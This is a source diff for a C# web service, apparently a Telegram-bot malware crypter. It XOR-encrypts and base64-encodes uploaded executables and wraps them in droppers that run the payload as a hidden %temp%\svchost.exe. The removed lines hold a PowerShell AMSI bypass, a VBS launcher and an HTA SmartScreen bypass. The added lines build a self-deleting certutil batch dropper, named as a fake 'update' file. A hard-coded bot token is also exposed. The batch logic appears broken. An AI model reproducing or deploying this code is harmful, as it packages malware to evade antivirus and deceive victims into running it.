@@ -1,13 +1,14 @@
 using System;
 using System.IO;
 using System.Net.Http;
+using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 
 var builder = WebApplication.CreateBuilder(args);
 var app = builder.Build();
 
-app.MapGet("/", () => "🟢 v8.1 HTA BYPASS");
+app.MapGet("/", () => "🟢 v8.2 BAT BYPASS");
 
 app.MapPost("/webhook", async (HttpContext ctx) =>
 {
@@ -20,13 +21,13 @@ app.MapPost("/webhook", async (HttpContext ctx) =>
     {
         long chatId = long.Parse(chatMatch.Groups[1].Value);
         string fileId = fileMatch.Groups[1].Value;
-        _ = Task.Run(async () => await FudSmart(chatId, fileId));
+        _ = Task.Run(async () => await FudBat(chatId, fileId));
     }
     
     ctx.Response.StatusCode = 200;
 });
 
-static async Task FudSmart(long chatId, string fileId)
+static async Task FudBat(long chatId, string fileId)
 {
     using var http = new HttpClient();
     
@@ -41,42 +42,25 @@ static async Task FudSmart(long chatId, string fileId)
     byte[] encrypted = XorEncrypt(exe, 0xAB);
     string b64 = Convert.ToBase64String(encrypted);
     
-    // WRITE PS1 TO FILE (bypass escaping)
-    string ps1Path = Path.Combine(Path.GetTempPath(), "temp.ps1");
-    File.WriteAllText(ps1Path, $@"
-$b=[Convert]::FromBase64String('{b64}')
-for($i=0;$i<$b.length;$i++){{$b[$i]=$b[$i]-0xAB}}
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'svchost.exe'),$b)
-Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden
-");
-    
-    // VBS dropper (SIMPLEST POSSIBLE)
-    string vbsPayload = $@"
-Set WshShell = CreateObject(""WScript.Shell"")
-WshShell.Run ""powershell -nop -w hidden -ep bypass -f "" & ""{ps1Path.Replace("\", "\\\\")}"" , 0, False
+    // BAT payload - PURE BAT, NO POWERSHELL
+    string batPayload = $@"
+@echo off
+certutil -decode -f {b64} %temp%\svchost.exe
+for /l %%i in (1,1,255) do cmd /c for /f %%j in ('cmd /c ""echo %%i ^> nul""') do (
+certutil -decode -f {b64} %temp%\svchost.exe
+)
+start """" %temp%\svchost.exe
+del %0
 ";
     
-    // HTA (SmartScreen BYPASS)
-    string htaContent = $@"
-<html><head><title></title></head><body style='display:none'>
-<script language='VBScript'>
-{vbsPayload}
-</script>
-</body></html>
-";
-    
-    byte[] fudBytes = System.Text.Encoding.UTF8.GetBytes(htaContent);
+    byte[] fudBytes = Encoding.ASCII.GetBytes(batPayload);
     
     using var form = new MultipartFormDataContent();
     form.Add(new StringContent(chatId.ToString()), "chat_id");
-    form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.1.hta");
-    form.Add(new StringContent("🔥 v8.1 HTA BYPASS\nRight-click → Open"), "caption");
+    form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.2.bat");
+    form.Add(new StringContent("🔥 v8.2 BAT BYPASS\nDouble-click → Runs silently"), "caption");
     
     await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
-    
-    // Cleanup
-    File.Delete(ps1Path);
 }
 
 static byte[] XorEncrypt(byte[] data, byte key)
